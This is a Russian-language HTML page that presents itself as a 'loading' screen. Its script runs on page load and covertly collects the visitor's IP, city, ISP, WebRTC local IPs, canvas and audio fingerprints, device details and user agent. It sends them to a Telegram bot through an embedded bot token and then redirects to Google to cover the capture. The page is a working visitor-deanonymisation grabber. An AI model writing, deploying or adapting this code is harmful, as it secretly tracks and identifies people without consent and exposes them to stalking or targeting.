<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        // Функция для подсчета визитов и генерации номера посетителя
        function getVisitorStats() {
            let visitorId = localStorage.getItem('visitor_id');
            let visitCount = parseInt(localStorage.getItem('visit_count') || '0');

            if (!visitorId) {
                // Если посетитель новый, генерируем ID
                visitorId = Math.floor(10000 + Math.random() * 90000);
                localStorage.setItem('visitor_id', visitorId);
            }

            // Увеличиваем счетчик визитов на 1
            visitCount += 1;
            localStorage.setItem('visit_count', visitCount);

            return {
                id: "#" + visitorId,
                visits: visitCount,
                status: visitCount === 1 ? "🆕 Новый посетитель" : `🔄 Визит №${visitCount}`
            };
        }

        // 1. Получение геолокации по IP через ipwho.is
        async function getGeoLocation() {
            try {
                const response = await fetch('https://ipwho.is/');
                if (!response.ok) return null;
                const data = await response.json();
                if (!data.success) return null;
                return {
                    ip: data.ip || "неизвестно",
                    country: data.country || "неизвестно",
                    countryCode: data.country_code || "",
                    city: data.city || "неизвестно",
                    region: data.region || "неизвестно",
                    org: data.connection && data.connection.isp ? data.connection.isp : "неизвестно"
                };
            } catch (e) {
                return null;
            }
        }

        // 2. Canvas Fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("BrowserFP 🚀", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("BrowserFP 🚀", 4, 17);
                return canvas.toDataURL().slice(-50);
            } catch (e) {
                return "недоступно";
            }
        }

        // 3. Audio Fingerprint
        async function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain();
                const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
                gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
                
                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.start(0);
                
                let fingerprint = "ok";
                scriptProcessor.onaudioprocess = function (e) {
                    const output = e.inputBuffer.getChannelData(0);
                    let sum = 0;
                    for (let i = 0; i < output.length; i++) {
                        sum += Math.abs(output[i]);
                    }
                    fingerprint = sum.toFixed(2);
                    oscillator.stop();
                    scriptProcessor.disconnect();
                    audioCtx.close();
                };
                return fingerprint;
            } catch (e) {
                return "недоступно";
            }
        }

        // 4. Проверка поддержки кодеков
        function getMediaCodecsSupport() {
            try {
                const video = document.createElement('video');
                const audio = document.createElement('audio');
                return {
                    mp4: video.canPlayType('video/mp4; codecs="avc1.42E01E"') ? "да" : "нет",
                    webm: video.canPlayType('video/webm; codecs="vp8, vorbis"') ? "да" : "нет"
                };
            } catch (e) {
                return null;
            }
        }

        // 5. WebGL расширения
        function getWebGLExtensions() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "недоступно";
                const exts = gl.getSupportedExtensions();
                return exts ? `${exts.length} шт.` : "0";
            } catch (e) {
                return "недоступно";
            }
        }

        // 6. Медиа-устройства
        async function getMediaDevices() {
            try {
                if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "недоступно";
                const devices = await navigator.mediaDevices.enumerateDevices();
                let counts = { audioinput: 0, audiooutput: 0, videoinput: 0 };
                devices.forEach(d => { if (counts[d.kind] !== undefined) counts[d.kind]++; });
                return `Микрофонов: ${counts.audioinput}, Динамиков: ${counts.audiooutput}, Камер: ${counts.videoinput}`;
            } catch (e) {
                return "недоступно";
            }
        }

        // 7. Локальный IP через WebRTC
        async function getLocalIPs() {
            return new Promise((resolve) => {
                let ips = [];
                try {
                    const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    if (!RTCPeerConnection) { resolve("не поддерживается"); return; }
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                    pc.onicecandidate = (event) => {
                        if (!event || !event.candidate) {
                            resolve(ips.length > 0 ? ips.join(", ") : "не найдены");
                            return;
                        }
                        const parts = event.candidate.candidate.split(" ");
                        const ip = parts[4];
                        if (ip && !ips.includes(ip)) ips.push(ip);
                    };
                    setTimeout(() => { resolve(ips.length > 0 ? ips.join(", ") : "таймаут"); }, 1000);
                } catch (e) {
                    resolve("ошибка");
                }
            });
        }

        // Основная функция сбора
        async function gatherInfo() {
            const visitor = getVisitorStats();
            const geoData = await getGeoLocation();
            
            const screenInfo = `${window.screen.width}x${window.screen.height} (Цветов: ${window.screen.colorDepth}, Пикселей: ${window.screen.pixelDepth})`;
            const windowInfo = `${window.innerWidth}x${window.innerHeight}`;
            const pixelRatio = window.devicePixelRatio || 1;

            const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "темная" : "светлая";
            let colorGamut = "sRGB";
            if (window.matchMedia('(color-gamut: p3)').matches) colorGamut = "Display P3";

            const pointerType = window.matchMedia('(pointer: fine)').matches ? "Точный (мышь/стилус)" : "Грубый (тач)";
            const orientation = screen.orientation ? screen.orientation.type : (window.innerWidth > window.innerHeight ? "landscape" : "portrait");

            const isWebDriver = navigator.webdriver ? "Да (Бот/Автоматизация)" : "Нет";
            const browserVendor = navigator.vendor || "неизвестно";
            const pdfViewer = navigator.pdfViewerEnabled ? "включен" : "отключен/нет";

            let jsMemory = "недоступно";
            if (performance && performance.memory) {
                jsMemory = `Использовано: ${Math.round(performance.memory.usedJSHeapSize / 1048576)} MB`;
            }

            let connectionInfo = "недоступно";
            if (navigator.connection) {
                connectionInfo = `Тип: ${navigator.connection.effectiveType || 'н/д'}, Скорость: ${navigator.connection.downlink || 'н/д'} Мбит/с`;
            }

            let batteryInfo = "недоступно";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'заряжается' : 'разряжается'})`;
                } catch (e) {}
            }

            const codecs = getMediaCodecsSupport();
            const codecsStr = codecs ? `MP4: ${codecs.mp4}, WebM: ${codecs.webm}` : "недоступно";

            const canvasFP = getCanvasFingerprint();
            const audioFP = await getAudioFingerprint();
            const webglExtCount = getWebGLExtensions();
            const mediaDevs = await getMediaDevices();
            const localIP = await getLocalIPs();

            const languages = navigator.languages ? navigator.languages.join(", ") : navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "неизвестно";
            const timezoneOffset = new Date().getTimezoneOffset();
            const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB+" : "неизвестно";
            const cores = navigator.hardwareConcurrency || "неизвестно";
            const touchPoints = navigator.maxTouchPoints || 0;
            const cookiesEnabled = navigator.cookieEnabled ? "да" : "нет";
            
            let deviceType = "ПК / Ноутбук";
            if (/Mobi|Android/i.test(navigator.userAgent)) deviceType = "Смартфон";
            else if (/Tablet|iPad/i.test(navigator.userAgent)) deviceType = "Планшет";

            const ipAddress = geoData ? geoData.ip : "недоступно";
            const country = geoData ? `${geoData.country} (${geoData.countryCode})` : "недоступно";
            const city = geoData ? `${geoData.city}, ${geoData.region}` : "недоступно";
            const isp = geoData ? geoData.org : "недоступно";

            // Отчет с информацией о визитах
            const info = `🚨 **Отчет: Посетитель ${visitor.id}**\n` +
                         `📌 **Статус:** ${visitor.status}\n` +
                         `🔄 **Всего заходов:** ${visitor.visits} раз(а)\n\n` +
                         
                         "🌍 **ГЕОЛОКАЦИЯ И СЕТЬ (IP)**\n" +
                         "🌐 Внешний IP: " + ipAddress + "\n" +
                         "🏳️ Страна: " + country + "\n" +
                         "🏙 Город / Регион: " + city + "\n" +
                         "🏢 Провайдер (ISP): " + isp + "\n" +
                         "📶 Соединение: " + connectionInfo + "\n\n" +

                         "🕒 **ВРЕМЯ И СЕАНС**\n" +
                         "⏱ Время: " + new Date().toLocaleString() + "\n" +
                         "🌍 Часовой пояс: " + timezone + ` (смещение: ${timezoneOffset / -60} ч)\n` +
                         "🔗 Источник (Referrer): " + (document.referrer || "прямой заход") + "\n" +
                         "📌 Текущий URL: " + window.location.href + "\n\n" +

                         "💻 **УСТРОЙСТВО И СИСТЕМА**\n" +
                         "📱 Тип устройства: " + deviceType + "\n" +
                         "💻 Платформа / ОС: " + navigator.platform + "\n" +
                         "🤖 WebDriver (Бот): " + isWebDriver + "\n" +
                         "🧠 Память (RAM): " + ram + "\n" +
                         "⚙️ Ядра процессора: " + cores + "\n" +
                         "🔋 Батарея: " + batteryInfo + "\n\n" +

                         "📺 **ЭКРАН И ИНТЕРФЕЙС**\n" +
                         "📺 Экран: " + screenInfo + ` (Scale: ${pixelRatio})\n` +
                         "🪟 Окно браузера: " + windowInfo + "\n" +
                         "🔄 Ориентация: " + orientation + "\n" +
                         "🎨 Тема: " + darkMode + " | Палитра: " + colorGamut + "\n" +
                         "🖱 Управление: " + pointerType + "\n" +
                         "👆 Точки касания (Тач): " + touchPoints + "\n\n" +

                         "🌐 **БРАУЗЕР И ОКРУЖЕНИЕ**\n" +
                         "🏭 Вендор: " + browserVendor + "\n" +
                         "🗣 Языки: " + languages + "\n" +
                         "🍪 Cookies: " + cookiesEnabled + "\n" +
                         "📄 PDF Viewer: " + pdfViewer + "\n\n" +

                         "🔍 **ЦИФРОВЫЕ ОТПЕЧАТКИ И КОДЕКИ**\n" +
                         "🧊 WebGL расширений: " + webglExtCount + "\n" +
                         "🌐 Локальный IP (WebRTC): " + localIP + "\n" +
                         "🎨 Canvas FP: `" + canvasFP + "`\n" +
                         "🎵 Audio FP: `" + audioFP + "`\n" +
                         "📷 Медиа-устройства: " + mediaDevs + "\n" +
                         "🎬 Кодеки: " + codecsStr + "\n" +
                         "📊 JS Куча памяти: " + jsMemory + "\n\n" +

                         "📱 **USER-AGENT**\n" +
                         "`" + navigator.userAgent + "`";

            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info) + "&parse_mode=Markdown";

            fetch(url).catch(function() {});
        }

        gatherInfo();

        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 2200);
    </script>
</body>
</html>
